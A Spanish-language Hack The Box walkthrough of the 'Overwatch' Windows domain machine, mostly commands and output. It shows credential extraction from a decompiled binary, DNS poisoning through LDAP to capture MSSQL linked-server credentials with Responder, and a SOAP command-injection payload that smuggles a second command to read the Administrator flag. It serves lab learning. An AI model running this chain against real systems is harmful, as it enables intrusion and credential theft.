---
title: Overwatch
description: Overwatch
tags: [HTB]
---
## 1. Reconocimiento

### Escaneo de puertos

```bash
nmap -p- -vvv --min-rate 10000 10.129.36.29

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
6520/tcp  open  unknown
9389/tcp  open  adws
```

```bash
nmap -sSCV -Pn 10.129.36.29

PORT     STATE SERVICE       VERSION
389/tcp  open  ldap          Microsoft Windows AD LDAP (Domain: overwatch.htb)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   DNS_Domain_Name: overwatch.htb
|   DNS_Computer_Name: S200401.overwatch.htb
|   Product_Version: 10.0.20348
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
Service Info: Host: S200401; OS: Windows
```

```bash
echo "10.129.36.29 overwatch.htb S200401.overwatch.htb" | sudo tee -a /etc/hosts
```

### Enumeración SMB

```bash
nxc smb 10.129.36.29 -u 'anonymous' -p '' --shares

SMB  S200401  [+] overwatch.htb\anonymous: (Guest)
SMB  S200401  Share       Permissions
SMB  S200401  -----       -----------
SMB  S200401  IPC$        READ
SMB  S200401  software$   READ
SMB  S200401  SYSVOL      READ
```

> El share `software$` es accesible sin credenciales.
> 

```bash
smbclient '//10.129.36.29/software$' -U anonymous

smb: \> cd Monitoring
smb: \Monitoring\> ls
  overwatch.exe        AH     9728  Fri May 16 21:19:24 2025
  overwatch.exe.config AH     2163  Fri May 16 21:02:30 2025
  overwatch.pdb        AH    30208  Fri May 16 21:19:24 2025
  EntityFramework.dll  AH  4991352
  System.Data.SQLite.dll AH 450232
```

```bash
mget *
```

---

## 2. Vector de entrada — Credenciales hardcodeadas en binario + DNS Poisoning + Responder

### Paso 1 — Descompilar el binario y extraer credenciales

```bash
monodis --output=output.il overwatch.exe
grep -iE 'password|user|server|conn' output.il

IL_0001:  ldstr "Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;"
IL_0006:  stfld string MonitoringService::connectionString`

sqlsvc : TI0LKcfHzZw1Vv
```

```bash
nxc smb 10.129.36.29 -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv'

SMB  S200401  [+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv
```

### Paso 2 — Conectar a MSSQL y descubrir Linked Server SQL07

```bash
impacket-mssqlclient overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv'@10.129.36.29 -windows-auth -p 6520

[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
SQL (OVERWATCH\sqlsvc  guest@master)>
```

```bash
EXEC sp_linkedservers;

SRV_NAME             SRV_PROVIDERNAME
------------------   ----------------
S200401\SQLEXPRESS   SQLNCLI
SQL07                SQLNCLI
```

> Existe un **Linked Server** llamado `SQL07`. Cuando el servidor intenta conectarse a `SQL07`, resuelve ese hostname via DNS. Si controlamos el DNS del dominio, podemos apuntar `SQL07` a nuestra máquina y capturar las credenciales de conexión.
> 

### Paso 3 — DNS Poisoning via LDAP (dnstool.py)

**`dnstool.py`** (del toolkit de Dirk-jan) permite añadir o modificar registros DNS en el AD via LDAP usando credenciales de usuario estándar, ya que por defecto los usuarios autenticados pueden crear registros DNS en la zona del dominio.

```bash
git clone https://github.com/dirkjanm/krbrelayx
cd krbrelayx

python3 dnstool.py 10.129.36.29 \
  -u 'overwatch\sqlsvc' \
  -p 'TI0LKcfHzZw1Vv' \
  -dc-ip 10.129.36.29 \
  --zone overwatch.htb \
  -r SQL07 \
  -a add \
  -t A \
  -d 10.10.14.187`

[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

> Ahora `SQL07.overwatch.htb` resuelve a nuestra IP `10.10.14.187`.
> 

### Paso 4 — Levantar Responder para capturar credenciales cleartext

```bash
sudo responder -I tun0 -wv
```

### Paso 5 — Forzar la conexión al Linked Server desde MSSQL

```bash
SELECT * FROM OPENQUERY([SQL07], 'SELECT @@version');

[MSSQL] Received connection from 10.129.36.41
[MSSQL] Cleartext Client   : 10.129.36.41
[MSSQL] Cleartext Hostname : SQL07 ()
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx

`sqlmgmt : bIhBbzMMnB82yx
```

---

## 3. Acceso inicial

```bash
evil-winrm -i 10.129.36.29 -u sqlmgmt -p 'bIhBbzMMnB82yx'

- Evil-WinRM* PS C:\Users\sqlmgmt\Desktop> cat user.txt
[user flag]
```

---

## 4. Escalada de privilegios

### Paso 1 — Descubrir el servicio interno en puerto 8000

```bash
netsh http show servicestate

Registered URLs:
    HTTP://+:8000/MONITORSERVICE/
```

> Hay un servicio HTTP interno en `127.0.0.1:8000/MONITORSERVICE/`. Al inspeccionar el WSDL se descubre una operación `KillProcess` que acepta un `processName` — **inyección de comandos via parámetro SOAP**.
> 

### Paso 2 — Inyección de comandos en KillProcess para leer root.txt

El parámetro `processName` se pasa a un proceso de sistema sin sanitizar. Usando la sintaxis `proceso_legit; comando` se ejecuta el comando adicional.

```bash
cmd = "notepad; type C:\\Users\\Administrator\\Desktop\\root.txt"
xml = f'''<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName>{cmd}</processName>
    </KillProcess>
  </soap:Body>
</soap:Envelope>'''

with open('/tmp/rev.xml', 'w') as f:
    f.write(xml)
```

```bash
curl -s -X POST http://127.0.0.1:8000/MONITORSERVICE/ \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: http://tempuri.org/IMonitoringService/KillProcess" \
  -d @/tmp/rev.xml
```

```bash
<KillProcessResponse xmlns="http://tempuri.org/">
  <KillProcessResult>76672fa6afb9a903a8de5082470cc2fd</KillProcessResult>
</KillProcessResponse>
```

---

### Método alternativo — Credenciales en DISM log

> Durante la enumeración se encuentra un log de DISM con la línea de comandos del script de configuración que incluye la contraseña del Administrator en texto claro.
> 

```bash
Get-Content "C:\Windows\Logs\DISM\dism.log"
  | Select-String "Parent process command line" 
  | Select-String -NotMatch "wmiprvse.exe"`

powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass
  -File "C:\Windows\Temp\hygiene.ps1"
  -TargetAdmin Administrator -pass ReinhardHammer507
  -TargetUser sqlmgmt -dhcp -nu -nd

`Administrator : ReinhardHammer507
```

```bash
evil-winrm -i 10.129.36.29 -u Administrator -p 'ReinhardHammer507'

- Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
[root flag]
```

---

---

## 6. Lecciones aprendidas

- **Los binarios en shares SMB públicos son código fuente encubierto.** `overwatch.exe` en `software$` contenía la cadena de conexión con credenciales en texto claro en el IL descompilado. Siempre descompilar binarios .NET (`monodis`, `dnSpy`, `ilspy`) al encontrarlos en shares accesibles.
- **Los Linked Servers de MSSQL confían en el DNS del dominio.** Si un usuario puede añadir registros DNS via LDAP (permisos por defecto en AD), puede redirigir la conexión del Linked Server a su propia máquina. Responder captura las credenciales en cleartext porque MSSQL usa autenticación SQL (no Kerberos) para el linked server.
- **Los logs de sistema guardan comandos con contraseñas en texto claro.** `dism.log` registra la línea de comandos del proceso padre que lo invocó. Scripts de administración que pasan contraseñas como parámetros `pass` son visibles en logs de DISM, WMI y event logs.
- **Los servicios SOAP internos sin autenticación son RCE directo.** `/MONITORSERVICE/` escuchaba en localhost sin autenticación. Una vez con shell en la máquina, cualquier servicio local es accesible — siempre enumerar con `netsh http show servicestate` y `netstat -ano`.
- **En máquinas similares buscar:** shares SMB con binarios .NET descompilables, Linked Servers en MSSQL para DNS poisoning, logs de DISM/PowerShell con parámetros de contraseña, servicios HTTP internos con operaciones SOAP sin autenticar.



